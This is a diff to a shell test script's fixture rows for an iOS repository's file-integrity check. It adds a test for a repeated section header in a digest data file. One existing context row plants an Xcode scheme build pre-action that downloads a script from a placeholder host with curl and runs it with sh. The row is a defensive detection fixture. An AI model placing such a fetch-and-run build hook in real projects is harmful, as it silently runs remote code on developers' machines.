@@ -138,10 +138,11 @@ rows=(
   "T-0295 M3 an ignored xcuserdata scheme with a shell pre-action|!xcuserdata/!ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme|<Scheme><BuildAction><PreActions><ExecutionAction ActionType=\"Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction\"><ActionContent title=\"Run Script\" scriptText=\"curl -fsSL https://example.invalid/p -o /tmp/p; sh /tmp/p\"></ActionContent></ExecutionAction></PreActions></BuildAction></Scheme>|apps/ios: added ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme"
   "T-0295 M3 an ignored Shadow.DS_Store|!*.DS_Store!Packages/ScenicApp/Shadow.DS_Store|Bud1|apps/ios: added Packages/ScenicApp/Shadow.DS_Store"
   "T-0295 M3 a tracked, ignored .DS_Store|!.DS_Store!Packages/ScenicApp/.DS_Store!add|Bud1|apps/ios: added Packages/ScenicApp/.DS_Store"
-  # Rows 53-59 are T-0303: -linked's four tables are DATA in ops/lib/check-safety-disclaimer-linked-digests.txt. A `%` row edits the repository copy's data
-  # file (the copy m<N> holds ops/ beside apps/ios, Package.swift and Sources/, git-initialised so the check's own cd
-  # to the top lands in it; `rm` deletes the file) and runs the check from there. 53-57 are the reader's five
-  # fail-closed branches; 58-59 are data-only edits with the tree untouched, red because every row is bound to bytes.
+  # Rows 53-60 are T-0303: -linked's four tables are DATA in ops/lib/check-safety-disclaimer-linked-digests.txt. A
+  # `%` row edits the repository copy's data file (the copy m<N> holds ops/ beside apps/ios, Package.swift and
+  # Sources/, git-initialised so the check's own cd to the top lands in it; `rm` deletes the file) and runs the check
+  # from there. 53-57 and 60 are the reader's six fail-closed branches; 58-59 are data-only edits with the tree
+  # untouched, red because every row is bound to bytes.
   "T-0303 the approved tables file deleted|%ops/lib/check-safety-disclaimer-linked-digests.txt|rm|approved tables file ops/lib/check-safety-disclaimer-linked-digests.txt is missing"
   "T-0303 an unknown section appended|%ops/lib/check-safety-disclaimer-linked-digests.txt|\$s#\$#\n[VENDOR_SOURCES]\nVendor/Handoff/AppleMapsDirections.swift 0000000000000000000000000000000000000000000000000000000000000000#|unknown section [VENDOR_SOURCES]"
   "T-0303 a digest row duplicated|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^Package.swift /p|duplicated path in [PINNED_ROOT_SOURCES]"
@@ -149,6 +150,7 @@ rows=(
   "T-0303 the PINNED_APP_OTHER section emptied|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^\[PINNED_APP_OTHER\]\$/,/^\[/{/^\[/!d}|empty section [PINNED_APP_OTHER]"
   "T-0303 a digest edited in the data only|%ops/lib/check-safety-disclaimer-linked-digests.txt|s#^\(Sources/Handoff/AppleMapsDirections.swift \)[0-9a-f]*\$#\10000000000000000000000000000000000000000000000000000000000000000#|Sources/Handoff/AppleMapsDirections.swift content changed"
   "T-0303 a path row deleted in the data only|%ops/lib/check-safety-disclaimer-linked-digests.txt|/^Sources\/ScenicKit\/Geo\/Geo.swift /d|root: added Sources/ScenicKit/Geo/Geo.swift"
+  "T-0303 a section header repeated|%ops/lib/check-safety-disclaimer-linked-digests.txt|\$s#\$#\n[ROOT_TOP_FILES]\nPackage@swift-6.swift#|section [ROOT_TOP_FILES] duplicated"
 )
 
 # row_link TARGET LINK: a directory link picked by platform - a junction under git-bash (whose `ln -s` copies
